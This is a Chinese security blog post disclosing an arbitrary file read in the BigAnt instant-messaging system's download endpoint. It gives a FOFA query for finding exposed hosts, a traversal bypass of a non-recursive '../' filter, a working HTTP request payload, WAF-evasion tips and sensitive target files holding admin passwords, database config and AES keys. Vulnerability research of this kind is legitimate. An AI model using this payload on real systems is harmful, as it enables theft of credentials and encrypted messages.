---
title: "大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞"
source: https://mrxn.net/jswz/bigant-Public-download.html
asset_dir: assets/大蚂蚁-(bigant)-即时通讯系统-publiccontroller-任意文件读取漏洞
---

# 大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2026/2/25 13:24
* 343浏览
* [0评论](#comment)
* 25分钟阅读

深入探索

IM

软件

即时通信


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

杭州九麒科技大蚂蚁 (BigAnt) 即时通讯系统是一款企业级IM通信管理系统，提供多种功能支持。该系统的 PublicController download 接口存在任意[文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)/下载漏洞，攻击者可以通过特殊的参数绕过系统限制，读取系统上任意文件内容，造成敏感内容泄露或为进一步攻击做准备。

短信和即时消息

# 影响版本

BigAnt 5.5.x 及以上版本用户

[![大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](images/img-001-af66cd8e6523.webp)](https://image.mrxn.net/5623d2945cc347a388c16efc24905efc.webp)

经过测试，最新版本 6.0.1.20250407.1 也受影响

漏洞修复方案

深入探索

JSON处理工具

安全认证考试

身份验证

# fofa语法

> (body="/Public/static/admin/admin\_common.js" && body="/Public/lang/zh-cn.js.js") || title="即时通讯 系统登录" && body="/Public/static/ukey/Syunew3.js"

# 漏洞分析

直接看下 Application/Admin/Controller/PublicController.class.php 的实现逻辑

[![大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](images/img-002-910dc0c96c0b.webp)](https://image.mrxn.net/d4bdded8e2c34de6818161cec39d5c68.webp)

最开始的初始化部分没有权限校验，可以[未授权](https://mrxn.net/tag/%E6%9C%AA%E6%8E%88%E6%9D%83)访问。

深入探索

服务器安全服务

文件大小转换

云安全解决方案

比如访问 `/?m=Admin&c=Public&a=about` 获取系统版本信息

[![大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](images/img-003-2c0f7ecb3fdb.webp)](https://image.mrxn.net/9ede5c71fe704ed6a115a3e1efd44de4.webp)

可通过访问 `/Application/`目录下任意php文件，如`Common/Conf/config.php` 报错获取应安装物理路径

[![大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](images/img-004-aa02779ccf41.webp)](https://image.mrxn.net/d325cb69cad94fe59d53369e4bc2ce88.webp)

再看 `download()` 方法的实现逻辑

```
public function download(){
    if(!sp_user_islogin()){
       $this->error("user is not login");
    }
    $file = I('file');
    $name = I('name') ;
    $file = urldecode($file);
    sp_download($file,$name,1) ;
}
```

先看 `sp_user_islogin`

```
function sp_user_islogin(){
    return isset($_SESSION['user']) ;
}
```

因此， 这个接口需要登录后，利用，可配置前面的权限绕过[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)：[大蚂蚁 (BigAnt) 即时通讯系统 loginByToken 逻辑错误至权限绕过漏洞](https://mrxn.net/jswz/bigant-loginByToken-authbypass.html)或者弱口令账户、钓鱼cookie等进行组合利用。

再跟进 `sp_download`方法

```
/**
 * 此函数支持断点续传，但不支持HTTP的下载
 * @param string $path
 * @param string $name
 * @param number $isSelfRoot
 */
function sp_download($path='',$name = '',$isSelfRoot = 1){
    // 过滤 ../
    $path = str_replace("../", "", $path);

    //如果是相对路径，加上本站的地址
    if ($isSelfRoot){
       $path = $_SERVER ['DOCUMENT_ROOT'] . $path;
        //$path = $_SERVER ['HTTP_HOST'] . $path;
    }

    //取路径的文件名
    if ($name == ""){
       $info = pathinfo($path);
       $name = $info['basename'] ;
    }
    /** @var \Common\Logic\FileDownloadLogic $FileDownload */
    $FileDownload = D("Common/FileDownload",'Logic');
    $FileDownload->download($path,$name,true);
}
```

注意`$path = str_replace("../", "", $path);`的存在，因此不能进行目录穿越？

nono！因为`str_replace` 是非递归的，它只替换一遍！我们有两种姿势来绕过：

**第一种**：直接重复两遍，如**`/....//install.cmd`** **`str_replace`**替换后就变成了`/../` ，从而绕过目录限制。

**第二种**：如果服务器是 Windows 环境，开发者只过滤了正斜杠 `/`，而完全忽略了反斜杠 `\`，使用 `\..\` 即可直接绕过。

因此只要有一个普通权限，即可通过上述两种bypass姿势来绕过限制，达到任意文件读取的目的。

# 漏洞复现

> 需要注意thinkphp的路由特性，不区分大小写，且还支持如下等方式
>
> 漏洞修复方案
>
> /Admin/Public/download.html
>
> /Admin/Public/download

[![大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](images/img-005-e4b0608094c7.webp)](https://image.mrxn.net/25a37ebef700452382b881471350c6d8.webp)

```
GET /?m=Admin&c=Public&a=download&file=%2f%2e%2e%2e%2e%2f%2f%69%6e%73%74%61%6c%6c%2e%63%6d%64&name=README.txt HTTP/1.1
Host: bigant.mrxn.net
Cookie: PHPSESSID=xxxxx
```

[![大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](images/img-006-42dd03386a88.webp)](https://image.mrxn.net/fb07448f97ed40bd92aed4cd9145a039.webp)

成功读取到web根目录上一级目录下的 **install.cmd文件内容。**

因为`$file = urldecode($file);`的存在，我们还可以双重url编码参数file,达到bypass部分垃圾waf.

或者读取其他敏感文件如`/Runtime/Data/ms_admin.php` 它包含当前系统用户admin的密码

[![大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](images/img-007-f2b395026ad5.webp)](https://image.mrxn.net/ac96b8b5e2b94aa0a890aaee37b3f585.webp)

[![大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](images/img-008-16c9b04e0dc6.webp)](https://image.mrxn.net/32d586325e7f40a4aa13dc3f76c264eb.webp)

或者 installData.php ，包含系统数据库配置信息

[![大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](images/img-009-6c28a166e057.webp)](https://image.mrxn.net/f5a13924af7e41a79858b642926a0415.webp)

[![大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](images/img-010-b834c7436183.webp)](https://image.mrxn.net/d716439782e442c782d512b2dd711449.webp)

或者 msg\_encrypt\_key.php 包含消息、文件解密aes密钥

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#php](https://mrxn.net/tag/php)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#0day](https://mrxn.net/tag/0day)
* [#文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)  
文章链接：<https://mrxn.net/jswz/bigant-Public-download.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/bigant-Public-download.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 plus\_get\_favicon 任意文件上传漏洞](https://mrxn.net/jswz/bigant-plus_get_favicon-upload.html)

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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